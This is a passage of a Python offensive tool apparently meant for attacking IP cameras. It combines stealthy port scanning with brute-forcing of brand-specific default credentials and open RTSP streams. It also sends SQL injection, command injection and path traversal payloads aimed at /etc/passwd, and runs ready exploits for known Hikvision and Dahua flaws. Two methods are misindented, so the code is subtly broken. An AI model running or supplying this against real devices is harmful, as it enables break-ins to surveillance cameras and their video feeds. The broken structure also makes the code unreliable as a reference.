#!/usr/bin/env python3
"""
CamXploit Enhanced - Advanced IP Camera Penetration Testing Tool
Author: Enhanced by PentestGPT
Version: 2.0
Description: Comprehensive IP camera security assessment tool for authorized penetration testing
"""

import requests
import threading
import time
import random
import json
import socket
import ssl
import urllib3
import warnings
import subprocess
import base64
import hashlib
import os
import sys
import ipaddress
import dns.resolver
from datetime import datetime
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import xml.etree.ElementTree as ET
from fpdf import FPDF
import argparse

# Suppress SSL warnings for penetration testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class CamXploitEnhanced:
    def __init__(self):
        self.target = None
        self.findings = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10
        self.threads = 50
        self.verbose = False
        self.output_file = None
        
        # User agents for stealth
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
        # Common camera ports
        self.camera_ports = [
            21, 22, 23, 25, 53, 80, 81, 110, 143, 443, 554, 993, 995,
            1024, 1025, 1026, 1027, 1028, 1029, 1030, 1080, 1433, 1521,
            1723, 1883, 2000, 2001, 2020, 2049, 2121, 2222, 3000, 3128,
            3306, 3389, 3478, 3689, 4000, 4001, 4002, 4003, 4004, 4005,
            4040, 4567, 5000, 5001, 5002, 5003, 5004, 5005, 5432, 5555,
            5800, 5900, 6000, 6001, 6379, 6667, 7000, 7001, 7002, 7070,
            7547, 7777, 8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007,
            8008, 8009, 8010, 8080, 8081, 8082, 8083, 8084, 8085, 8086,
            8087, 8088, 8089, 8090, 8091, 8092, 8093, 8094, 8095, 8096,
            8097, 8098, 8099, 8100, 8443, 8554, 8880, 8888, 8899, 9000,
            9001, 9002, 9080, 9090, 9091, 9100, 9999, 10000, 10001, 10554,
            37777, 37778, 50000, 50001, 50002, 55554
        ]
        
        # Camera-specific paths
        self.camera_paths = [
            '/', '/index.html', '/index.htm', '/login.html', '/login.htm',
            '/admin.html', '/admin.htm', '/main.html', '/main.htm',
            '/cgi-bin/main-cgi', '/cgi-bin/nobody/Machine.cgi',
            '/cgi-bin/guest/Machine.cgi', '/ISAPI/System/deviceInfo',
            '/onvif/device_service', '/axis-cgi/jpg/image.cgi',
            '/axis-cgi/mjpg/video.cgi', '/video.cgi', '/snapshot.cgi',
            '/mjpeg.cgi', '/mjpg/video.mjpg', '/video/live.mjpg',
            '/VideoInput/1/mjpeg.cgi', '/cgi-bin/snapshot.cgi',
            '/cgi-bin/video.cgi', '/webcapture', '/snap.jpg',
            '/image.jpg', '/tmpfs/auto.jpg', '/jpg/image.jpg',
            '/cgi-bin/api.cgi', '/web/', '/mobile/', '/ui/',
            '/dvr/', '/cam/', '/camera/', '/live/', '/stream/'
        ]
        
        # Default credentials
        self.default_creds = [
            ('admin', 'admin'), ('admin', '12345'), ('admin', 'password'),
            ('admin', ''), ('root', 'root'), ('root', 'admin'),
            ('root', '12345'), ('root', 'password'), ('root', ''),
            ('user', 'user'), ('user', 'password'), ('guest', 'guest'),
            ('admin', '888888'), ('admin', '123456'), ('service', 'service'),
            ('administrator', 'administrator'), ('admin', 'admin123'),
            ('admin', 'security'), ('admin', 'camera'), ('admin', 'system'),
            ('viewer', 'viewer'), ('operator', 'operator'), ('supervisor', 'supervisor'),
            # Brand-specific defaults
            ('admin', 'hikvision'), ('admin', 'hik12345'), ('admin', 'hikpassword'),
            ('admin', 'dahua'), ('admin', 'tlJwpbo6'), ('admin', 'xc3511'),
            ('admin', 'fliradmin'), ('admin', 'meinsm'), ('admin', 'jvc'),
            ('admin', 'pass'), ('admin', '4321'), ('admin', '1111'),
            ('admin', 'smcadmin'), ('666666', '666666'), ('888888', '888888'),
            ('admin', '000000'), ('admin', '111111'), ('admin', '1234'),
            ('admin', '54321'), ('admin', '7ujMko0admin'), ('admin', '9999'),
            ('admin', 'camera123'), ('admin', 'default'), ('admin', 'ip_camera'),
            ('admin', 'qwerty'), ('admin', 'welcome'), ('admin', 'administrator'),
        ]
        
        # Vulnerability signatures
        self.vuln_signatures = {
            'directory_traversal': [
                '../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '....//....//....//etc/passwd',
                '../../../proc/version', '..\\..\\..\\boot.ini'
            ],
            'command_injection': [
                '; cat /etc/passwd', '| whoami', '&& id', '`uname -a`',
                '$(whoami)', '; ping -c 3 127.0.0.1', '| ls -la',
                '&& cat /proc/version', '; ifconfig', '`ls`'
            ],
            'sql_injection': [
                "admin'--", "admin'/*", "' OR '1'='1", "admin'; DROP TABLE users; --",
                "' UNION SELECT 1,2,3--", "' OR 1=1#", "admin' OR '1'='1'--",
                "' OR 'a'='a", "admin') OR ('1'='1'--", "' OR 1=1 LIMIT 1--"
            ]
        }
        
        # Camera brand detection patterns
        self.brand_patterns = {
            'hikvision': ['hikvision', 'hik-connect', 'iVMS', 'sadp', 'isapi'],
            'dahua': ['dahua', 'dh-sd', 'dss', 'smartpss', 'gDMSS'],
            'axis': ['axis', 'vapix', 'axis communications'],
            'foscam': ['foscam', 'openeye'],
            'vivotek': ['vivotek', 'vivocam'],
            'pelco': ['pelco', 'videoxpert'],
            'bosch': ['bosch', 'rcp+'],
            'sony': ['sony', 'depa'],
            'panasonic': ['panasonic', 'wv-'],
            'samsung': ['samsung', 'snh-'],
            'tplink': ['tp-link', 'tplink'],
            'dlink': ['d-link', 'dlink', 'dcs-'],
            'netgear': ['netgear', 'arlo'],
            'ubiquiti': ['ubiquiti', 'unifi'],
            'amcrest': ['amcrest'],
            'reolink': ['reolink'],
            'lorex': ['lorex'],
            'swann': ['swann']
        }

    def banner(self):
        """Display enhanced banner"""
        banner_text = f"""
{Colors.CYAN}
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                        CamXploit Enhanced v2.0                       ║
    ║                   Advanced IP Camera Penetration Tool                ║
    ║                                                                       ║
    ║  {Colors.YELLOW}⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️{Colors.CYAN}                  ║
    ║                                                                       ║
    ║  Features:                                                            ║
    ║  • Advanced port scanning & service detection                        ║
    ║  • Vulnerability assessment & exploitation                           ║
    ║  • Authentication bypass testing                                     ║
    ║  • Network traffic analysis                                          ║
    ║  • Comprehensive reporting                                           ║
    ║                                                                       ║
    ╚═══════════════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner_text)

    def log_finding(self, severity, title, description, proof=None, recommendation=None):
        """Log security findings"""
        finding = {
            'timestamp': datetime.now().isoformat(),
            'severity': severity,
            'title': title,
            'description': description,
            'proof': proof,
            'recommendation': recommendation,
            'target': self.target
        }
        self.findings.append(finding)
        
        # Color-coded output
        colors = {
            'CRITICAL': Colors.RED,
            'HIGH': Colors.RED,
            'MEDIUM': Colors.YELLOW,
            'LOW': Colors.GREEN,
            'INFO': Colors.CYAN
        }
        
        color = colors.get(severity, Colors.WHITE)
        print(f"{color}[{severity}] {title}: {description}{Colors.END}")
        
        if self.verbose and proof:
            print(f"   Proof: {proof}")

    def random_delay(self, min_delay=0.1, max_delay=0.5):
        """Random delay for stealth"""
        time.sleep(random.uniform(min_delay, max_delay))

    def get_random_user_agent(self):
        """Get random user agent for stealth"""
        return random.choice(self.user_agents)

    def validate_target(self, target):
        """Validate target IP or hostname"""
        try:
            # Try to parse as IP
            ipaddress.ip_address(target)
            return True
        except ValueError:
            try:
                # Try to resolve hostname
                socket.gethostbyname(target)
                return True
            except socket.gaierror:
                return False

    def port_scan(self, target, ports, timeout=3):
        """Enhanced port scanning with service detection"""
        print(f"{Colors.CYAN}[+] Starting port scan on {target}...{Colors.END}")
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                if result == 0:
                    # Try to grab banner
                    banner = self.grab_banner(target, port)
                    service = self.detect_service(port, banner)
                    open_ports.append({
                        'port': port,
                        'service': service,
                        'banner': banner
                    })
                    print(f"{Colors.GREEN}[+] Port {port} open - {service}{Colors.END}")
                sock.close()
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.RED}[-] Error scanning port {port}: {e}{Colors.END}")
            
            self.random_delay()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(scan_port, ports)
        
        return open_ports

    def grab_banner(self, target, port, timeout=5):
        """Grab service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
            
            # Send HTTP request for web services
            if port in [80, 443, 8080, 8081, 8000]:
                request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.get_random_user_agent()}\r\n\r\n"
                sock.send(request.encode())
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            return banner.strip()
        except:
            return ""

        def detect_service(self, port, banner):
         """Enhanced service detection"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
            443: 'HTTPS', 554: 'RTSP', 993: 'IMAPS', 995: 'POP3S',
            1080: 'SOCKS', 1433: 'MSSQL', 1521: 'Oracle', 1723: 'PPTP',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 37777: 'Dahua DVR'
        }
        
        # Analyze banner for more specific detection
        if banner:
            banner_lower = banner.lower()
            if 'hikvision' in banner_lower:
                return 'Hikvision Camera'
            elif 'dahua' in banner_lower:
                return 'Dahua Camera'
            elif 'axis' in banner_lower:
                return 'Axis Camera'
            elif 'rtsp' in banner_lower:
                return 'RTSP Stream'
            elif 'onvif' in banner_lower:
                return 'ONVIF Service'
        
        return services.get(port, f'Unknown ({port})')

    def web_scan(self, target, ports):
        """Enhanced web service scanning"""
        print(f"{Colors.CYAN}[+] Scanning web services...{Colors.END}")
        web_services = []
        
        for port_info in ports:
            port = port_info['port']
            if port in [80, 443, 8080, 8081, 8000, 8001, 8888, 9000]:
                protocols = ['https'] if port == 443 else ['http']
                if port in [8443]:
                    protocols = ['https']
                
                for protocol in protocols:
                    base_url = f"{protocol}://{target}:{port}"
                    try:
                        self.session.headers.update({'User-Agent': self.get_random_user_agent()})
                        response = self.session.get(base_url, timeout=10)
                        
                        web_service = {
                            'url': base_url,
                            'status': response.status_code,
                            'title': self.extract_title(response.text),
                            'server': response.headers.get('Server', 'Unknown'),
                            'content_length': len(response.content),
                            'headers': dict(response.headers)
                        }
                        
                        web_services.append(web_service)
                        print(f"{Colors.GREEN}[+] Web service found: {base_url} - {web_service['title']}{Colors.END}")
                        
                        # Test for common camera paths
                        self.test_camera_paths(base_url)
                        
                    except Exception as e:
                        if self.verbose:
                            print(f"{Colors.RED}[-] Error accessing {base_url}: {e}{Colors.END}")
                    
                    self.random_delay()
        
        return web_services

    def extract_title(self, html_content):
        """Extract title from HTML content"""
        try:
            import re
            title_match = re.search(r'<title[^>]*>([^<]+)</title>', html_content, re.IGNORECASE)
            if title_match:
                return title_match.group(1).strip()
        except:
            pass
        return "No Title"

    def test_camera_paths(self, base_url):
        """Test camera-specific paths"""
        interesting_paths = []
        
        for path in self.camera_paths:
            try:
                url = urljoin(base_url, path)
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    content_lower = response.text.lower()
                    
                    # Check for camera-related content
                    camera_indicators = [
                        'camera', 'video', 'stream', 'dvr', 'nvr', 'cctv',
                        'surveillance', 'monitor', 'live view', 'snapshot',
                        'mjpeg', 'rtsp', 'onvif'
                    ]
                    
                    if any(indicator in content_lower for indicator in camera_indicators):
                        interesting_paths.append(url)
                        self.log_finding('INFO', 'Camera Path Found', f'Accessible camera path: {url}')
                        
                        # Check for authentication
                        if 'login' in content_lower or 'password' in content_lower:
                            self.log_finding('MEDIUM', 'Login Page Found', f'Authentication required: {url}')
                        elif 'video' in content_lower or 'stream' in content_lower:
                            self.log_finding('HIGH', 'Unauthenticated Stream', f'Potential open video stream: {url}')
                
            except Exception as e:
                if self.verbose:
                    print(f"Error testing path {path}: {e}")
            
            self.random_delay(0.05, 0.2)
        
        return interesting_paths

    def brand_detection(self, target, web_services):
        """Enhanced camera brand detection"""
        print(f"{Colors.CYAN}[+] Detecting camera brand...{Colors.END}")
        detected_brands = []
        
        for service in web_services:
            try:
                response = self.session.get(service['url'], timeout=10)
                content = response.text.lower()
                headers = response.headers
                
                # Check content and headers for brand indicators
                for brand, patterns in self.brand_patterns.items():
                    for pattern in patterns:
                        if pattern in content or pattern in str(headers).lower():
                            detected_brands.append(brand)
                            self.log_finding('INFO', 'Camera Brand Detected', 
                                           f'Detected {brand.upper()} camera at {service["url"]}')
                            
                            # Run brand-specific tests
                            self.test_brand_specific_vulns(service['url'], brand)
                            break
                
            except Exception as e:
                if self.verbose:
                    print(f"Error in brand detection: {e}")
        
        return list(set(detected_brands))

    def test_brand_specific_vulns(self, base_url, brand):
        """Test brand-specific vulnerabilities"""
        if brand == 'hikvision':
            self.test_hikvision_vulns(base_url)
        elif brand == 'dahua':
            self.test_dahua_vulns(base_url)
        elif brand == 'axis':
            self.test_axis_vulns(base_url)

    def test_hikvision_vulns(self, base_url):
        """Test Hikvision-specific vulnerabilities"""
        # CVE-2017-7921 - Information disclosure
        try:
            url = urljoin(base_url, '/System/configurationFile?auth=YWRtaW46MTEK')
            response = self.session.get(url, timeout=10)
            if response.status_code == 200 and 'admin' in response.text:
                self.log_finding('CRITICAL', 'CVE-2017-7921', 
                               'Hikvision configuration file disclosure vulnerability', 
                               proof=url)
        except:
            pass
        
        # CVE-2021-36260 - Command injection
        try:
            url = urljoin(base_url, '/SDK/webLanguage')
            payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(id)</language>'
            headers = {'Content-Type': 'application/xml'}
            response = self.session.put(url, data=payload, headers=headers, timeout=10)
            if 'uid=' in response.text:
                self.log_finding('CRITICAL', 'CVE-2021-36260', 
                               'Hikvision command injection vulnerability', 
                               proof=f'{url} with payload: {payload}')
        except:
            pass

    def test_dahua_vulns(self, base_url):
        """Test Dahua-specific vulnerabilities"""
        # CVE-2021-33044 - Authentication bypass
        try:
            url = urljoin(base_url, '/current_config/passwd')
            response = self.session.get(url, timeout=10)
            if response.status_code == 200 and ('admin' in response.text or 'password' in response.text):
                self.log_finding('CRITICAL', 'CVE-2021-33044', 
                               'Dahua authentication bypass - password disclosure', 
                               proof=url)
        except:
            pass
        
        # Console access
        try:
            url = urljoin(base_url, '/console/')
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                self.log_finding('HIGH', 'Dahua Console Access', 
                               'Dahua console may be accessible', 
                               proof=url)
        except:
            pass

    def test_axis_vulns(self, base_url):
        """Test Axis-specific vulnerabilities"""
        # Default credentials
        try:
            url = urljoin(base_url, '/axis-cgi/jpg/image.cgi')
            response = self.session.get(url, auth=('root', 'pass'), timeout=10)
            if response.status_code == 200:
                self.log_finding('HIGH', 'Axis Default Credentials', 
                               'Default credentials (root:pass) work', 
                               proof=url)
        except:
            pass

    def test_default_credentials(self, web_services):
        """Enhanced credential testing"""
        print(f"{Colors.CYAN}[+] Testing default credentials...{Colors.END}")
        
        for service in web_services:
            base_url = service['url']
            
            # Test HTTP Basic Auth
            for username, password in self.default_creds:
                try:
                    response = self.session.get(base_url, auth=(username, password), timeout=5)
                    if response.status_code == 200 and 'login' not in response.url.lower():
                        self.log_finding('CRITICAL', 'Default Credentials Found', 
                                       f'Working credentials: {username}:{password}', 
                                       proof=f'{base_url} with {username}:{password}',
                                       recommendation='Change default credentials immediately')
                        return username, password
                except:
                    pass
                
                self.random_delay(0.1, 0.3)
            
            # Test form-based authentication
            self.test_form_auth(base_url)
        
        return None

    def test_form_auth(self, base_url):
        """Test form-based authentication"""
        try:
            # Look for login forms
            response = self.session.get(base_url, timeout=10)
            if 'form' in response.text.lower() and 'password' in response.text.lower():
                
                # Extract form details
                form_action = self.extract_form_action(response.text)
                if form_action:
                    login_url = urljoin(base_url, form_action)
                    
                    for username, password in self.default_creds[:10]:  # Test top 10
                        try:
                            data = {
                                'username': username, 'password': password,
                                'user': username, 'pass': password,
                                'login': username, 'pwd': password
                            }
                            
                            response = self.session.post(login_url, data=data, timeout=10)
                            if response.status_code == 302 or 'dashboard' in response.text.lower():
                                self.log_finding('CRITICAL', 'Form Auth Bypass', 
                                               f'Form login successful: {username}:{password}', 
                                               proof=f'{login_url} with {username}:{password}')
                                break
                        except:
                            pass
                        
                        self.random_delay(0.2, 0.5)
        except:
            pass

    def extract_form_action(self, html_content):
        """Extract form action attribute"""
        try:
            import re
            action_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
            if action_match:
                return action_match.group(1)
        except:
            pass
        return None

    def test_authentication_bypass(self, web_services):
        """Test for authentication bypass vulnerabilities"""
        print(f"{Colors.CYAN}[+] Testing authentication bypass techniques...{Colors.END}")
        
        for service in web_services:
            base_url = service['url']
            
            # SQL injection in login
            sql_payloads = self.vuln_signatures['sql_injection']
            for payload in sql_payloads:
                try:
                    data = {'username': payload, 'password': 'test'}
                    response = self.session.post(urljoin(base_url, '/login'), data=data, timeout=10)
                    
                    if response.status_code == 302 or 'dashboard' in response.text.lower():
                        self.log_finding('CRITICAL', 'SQL Injection Auth Bypass', 
                                       f'SQL injection successful with payload: {payload}', 
                                       proof=f'{base_url}/login with {payload}',
                                       recommendation='Implement proper input validation and parameterized queries')
                        break
                except:
                    pass
                
                self.random_delay(0.1, 0.3)
            
            # Directory traversal
            self.test_directory_traversal(base_url)
            
            # Command injection
            self.test_command_injection(base_url)

    def test_directory_traversal(self, base_url):
        """Test for directory traversal vulnerabilities"""
        traversal_paths = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//....//etc/passwd'
        ]
        
        test_params = ['file', 'path', 'dir', 'folder', 'document', 'page']
        
        for param in test_params:
            for payload in traversal_paths:
                try:
                    url = f"{base_url}?{param}={payload}"
                    response = self.session.get(url, timeout=10)
                    
                    if 'root:' in response.text or 'administrator' in response.text.lower():
                        self.log_finding('CRITICAL', 'Directory Traversal', 
                                       f'Directory traversal vulnerability found', 
                                       proof=url,
                                       recommendation='Implement proper input validation and file access controls')
                        return
                except:
                    pass
                
                self.random_delay(0.1, 0.2)

        def test_command_injection(self, base_url):
         """Test for command injection vulnerabilities"""
        injection_payloads = self.vuln_signatures['command_injection']
        test_params = ['ip', 'host', 'cmd', 'exec', 'system', 'ping']
        
        for param in test_params:
            for payload in injection_payloads:
                try:
                    url = f"{base_url}/cgi-bin/test.cgi"
                    data = {param: f"127.0.0.1{payload}"}
                    response = self.session.post(url, data=data, timeout=10)
                    
                    # Check for command execution indicators
                    if any(indicator in response.text.lower() for indicator in 
                          ['uid=', 'gid=', 'root', 'administrator', 'volume serial number']):
                        self.log_finding('CRITICAL', 'Command Injection', 
                                       f'Command injection vulnerability found', 
                                       proof=f'{url} with payload: {payload}',
                                       recommendation='Implement proper input validation and command sanitization')
                        return
                except:
                    pass
                
                self.random_delay(0.1, 0.2)

    def test_rtsp_streams(self, target, open_ports):
        """Test RTSP stream access"""
        print(f"{Colors.CYAN}[+] Testing RTSP streams...{Colors.END}")
        
        rtsp_ports = [554, 8554, 1554, 7070]
        rtsp_paths = [
            '/live', '/stream', '/cam', '/video', '/channel1', '/ch01',
            '/live/ch00_0', '/cam/realmonitor', '/streaming/channels/1',
            '/MediaInput/h264', '/mpeg4/media.amp', '/axis-media/media.amp'
        ]
        
        for port_info in open_ports:
            port = port_info['port']
            if port in rtsp_ports or 'rtsp' in port_info.get('service', '').lower():
                
                for path in rtsp_paths:
                    for username, password in [('', ''), ('admin', 'admin'), ('admin', ''), ('root', 'root')]:
                        try:
                            if username and password:
                                rtsp_url = f"rtsp://{username}:{password}@{target}:{port}{path}"
                            else:
                                rtsp_url = f"rtsp://{target}:{port}{path}"
                            
                            # Test RTSP connectivity
                            if self.test_rtsp_stream(rtsp_url):
                                severity = 'CRITICAL' if not username else 'HIGH'
                                self.log_finding(severity, 'RTSP Stream Access', 
                                               f'Accessible RTSP stream found', 
                                               proof=rtsp_url,
                                               recommendation='Implement proper authentication for RTSP streams')
                        except:
                            pass
                        
                        self.random_delay(0.2, 0.5)

    def test_rtsp_stream(self, rtsp_url):
        """Test if RTSP stream is accessible"""
        try:
            import subprocess
            # Use ffprobe to test stream
            cmd = ['ffprobe', '-v', 'quiet', '-show_entries', 'format=duration', 
                   '-of', 'csv=p=0', rtsp_url]
            result = subprocess.run(cmd, timeout=10, capture_output=True, text=True)
            return result.returncode == 0
        except:
            # Fallback method - try to connect to RTSP port
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                parsed = urlparse(rtsp_url)
                sock.connect((parsed.hostname, parsed.port or 554))
                sock.close()
                return True
            except:
                return False

    def test_onvif_service(self, target, open_ports):
        """Test ONVIF service discovery and vulnerabilities"""
        print(f"{Colors.CYAN}[+] Testing ONVIF services...{Colors.END}")
        
        onvif_ports = [80, 8080, 8081, 9090, 10000]
        onvif_paths = [
            '/onvif/device_service',
            '/onvif/Device',
            '/device_service',
            '/onvif/device',
            '/Device'
        ]
        
        for port_info in open_ports:
            port = port_info['port']
            if port in onvif_ports:
                
                for path in onvif_paths:
                    try:
                        url = f"http://{target}:{port}{path}"
                        
                        # ONVIF discovery request
                        soap_request = '''<?xml version="1.0" encoding="UTF-8"?>
                        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                                     xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
                            <soap:Body>
                                <tds:GetDeviceInformation/>
                            </soap:Body>
                        </soap:Envelope>'''
                        
                        headers = {
                            'Content-Type': 'application/soap+xml; charset=utf-8',
                            'SOAPAction': 'http://www.onvif.org/ver10/device/wsdl/GetDeviceInformation'
                        }
                        
                        response = self.session.post(url, data=soap_request, headers=headers, timeout=10)
                        
                        if response.status_code == 200 and 'onvif' in response.text.lower():
                            self.log_finding('INFO', 'ONVIF Service Found', 
                                           f'ONVIF service discovered at {url}')
                            
                            # Test for authentication bypass
                            self.test_onvif_auth_bypass(url)
                            
                    except Exception as e:
                        if self.verbose:
                            print(f"Error testing ONVIF: {e}")
                    
                    self.random_delay(0.2, 0.5)

    def test_onvif_auth_bypass(self, onvif_url):
        """Test ONVIF authentication bypass"""
        # Test unauthenticated access to sensitive operations
        sensitive_operations = [
            'GetUsers', 'GetSystemDateAndTime', 'GetCapabilities',
            'GetNetworkInterfaces', 'GetHostname'
        ]
        
        for operation in sensitive_operations:
            try:
                soap_request = f'''<?xml version="1.0" encoding="UTF-8"?>
                <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                             xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
                    <soap:Body>
                        <tds:{operation}/>
                    </soap:Body>
                </soap:Envelope>'''
                
                headers = {
                    'Content-Type': 'application/soap+xml; charset=utf-8',
                    'SOAPAction': f'http://www.onvif.org/ver10/device/wsdl/{operation}'
                }
                
                response = self.session.post(onvif_url, data=soap_request, headers=headers, timeout=10)
                
                if response.status_code == 200 and 'fault' not in response.text.lower():
                    severity = 'CRITICAL' if operation == 'GetUsers' else 'HIGH'
                    self.log_finding(severity, f'ONVIF {operation} Accessible', 
                                   f'Unauthenticated access to {operation}', 
                                   proof=f'{onvif_url} - {operation}')
                    
            except Exception as e:
                if self.verbose:
                    print(f"Error testing {operation}: {e}")
            
            self.random_delay(0.1, 0.3)

    def test_firmware_exposure(self, web_services):
        """Test for firmware and configuration file exposure"""
        print(f"{Colors.CYAN}[+] Testing for firmware/config exposure...{Colors.END}")
        
        sensitive_files = [
            '/config.bin', '/config.xml', '/config.json', '/configuration.xml',
            '/backup.bin', '/backup.xml', '/export.xml', '/settings.xml',
            '/firmware.bin', '/update.bin', '/upgrade.bin', '/system.xml',
            '/device.xml', '/network.xml', '/users.xml', '/accounts.xml',
            '/.htpasswd', '/passwd', '/shadow', '/etc/passwd', '/etc/shadow',
            '/web.xml', '/WEB-INF/web.xml', '/conf/server.xml'
        ]
        
        for service in web_services:
            base_url = service['url']
            
            for file_path in sensitive_files:
                try:
                    url = urljoin(base_url, file_path)
                    response = self.session.get(url, timeout=10)
                    
                    if response.status_code == 200 and len(response.content) > 100:
                        # Check content type and content for sensitivity
                        content_type = response.headers.get('content-type', '').lower()
                        content = response.text.lower()
                        
                        if any(indicator in content for indicator in 
                              ['password', 'username', 'admin', 'root', 'config', 'settings']):
                            self.log_finding('CRITICAL', 'Sensitive File Exposure', 
                                           f'Sensitive file accessible: {file_path}', 
                                           proof=url,
                                           recommendation='Restrict access to configuration files')
                        elif content_type in ['application/octet-stream', 'application/x-binary']:
                            self.log_finding('HIGH', 'Binary File Exposure', 
                                           f'Binary file accessible: {file_path}', 
                                           proof=url)
                        
                except Exception as e:
                    if self.verbose:
                        print(f"Error testing {file_path}: {e}")
                
                self.random_delay(0.1, 0.2)

    def test_cgi_vulnerabilities(self, web_services):
        """Test CGI-specific vulnerabilities"""
        print(f"{Colors.CYAN}[+] Testing CGI vulnerabilities...{Colors.END}")
        
        cgi_paths = [
            '/cgi-bin/main-cgi', '/cgi-bin/nobody/Machine.cgi',
            '/cgi-bin/guest/Machine.cgi', '/cgi-bin/operator/Machine.cgi',
            '/cgi-bin/admin/Machine.cgi', '/cgi-bin/viewer/Machine.cgi',
            '/cgi-bin/hi3510/param.cgi', '/cgi-bin/hi3510/snap.cgi',
            '/cgi-bin/user/Config.cgi', '/cgi-bin/Config.cgi',
            '/cgi-bin/magicBox.cgi', '/cgi-bin/service.cgi'
        ]
        
        for service in web_services:
            base_url = service['url']
            
            for cgi_path in cgi_paths:
                try:
                    url = urljoin(base_url, cgi_path)
                    
                    # Test basic access
                    response = self.session.get(url, timeout=10)
                    if response.status_code == 200:
                        self.log_finding('MEDIUM', 'CGI Script Accessible', 
                                       f'CGI script found: {cgi_path}', 
                                       proof=url)
                    
                    # Test with common parameters
                    test_params = {
                        'action': 'get',
                        'cmd': 'getInfo',
                        'var': 'sys_info',
                        'file': '/etc/passwd'
                    }
                    
                    for param, value in test_params.items():
                        param_url = f"{url}?{param}={value}"
                        response = self.session.get(param_url, timeout=10)
                        
                        if response.status_code == 200 and len(response.content) > 50:
                            content = response.text.lower()
                            if any(indicator in content for indicator in 
                                  ['root:', 'admin', 'system', 'config', 'error']):
                                self.log_finding('HIGH', 'CGI Parameter Vulnerability', 
                                               f'CGI script responds to parameter: {param}', 
                                               proof=param_url)
                        
                except Exception as e:
                    if self.verbose:
                        print(f"Error testing CGI {cgi_path}: {e}")
                
                self.random_delay(0.1, 0.3)

    def test_information_disclosure(self, web_services):
        """Test for information disclosure vulnerabilities"""
        print(f"{Colors.CYAN}[+] Testing information disclosure...{Colors.END}")
        
        info_paths = [
            '/server-status', '/server-info', '/status', '/info.php',
            '/phpinfo.php', '/test.php', '/version', '/build',
            '/readme.txt', '/README', '/INSTALL', '/CHANGELOG',
            '/docs/', '/documentation/', '/help/', '/manual/',
            '/admin/', '/management/', '/config/', '/setup/',
            '/install/', '/upgrade/', '/update/', '/backup/',
            '/tmp/', '/temp/', '/log/', '/logs/', '/debug/'
        ]
        
        for service in web_services:
            base_url = service['url']
            
            for info_path in info_paths:
                try:
                    url = urljoin(base_url, info_path)
                    response = self.session.get(url, timeout=10)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        
                        # Check for sensitive information
                        sensitive_patterns = [
                            'version', 'build', 'configuration', 'database',
                            'password', 'secret', 'key', 'token', 'api',
                            'internal', 'private', 'confidential', 'admin'
                        ]
                        
                        if any(pattern in content for pattern in sensitive_patterns):
                            self.log_finding('MEDIUM', 'Information Disclosure', 
                                           f'Sensitive information exposed: {info_path}', 
                                           proof=url,
                                           recommendation='Remove or restrict access to information disclosure paths')
                        
                except Exception as e:
                    if self.verbose:
                        print(f"Error testing info path {info_path}: {e}")
                
                self.random_delay(0.1, 0.2)

    def generate_report(self):
        """Generate comprehensive penetration test report"""
        if not self.output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.output_file = f"camxploit_report_{self.target}_{timestamp}"
        
        # Generate JSON report
        json_report = {
            'target': self.target,
            'scan_date': datetime.now().isoformat(),
            'tool_version': 'CamXploit Enhanced v2.0',
                        'findings_summary': {
                'total': len(self.findings),
                'critical': len([f for f in self.findings if f['severity'] == 'CRITICAL']),
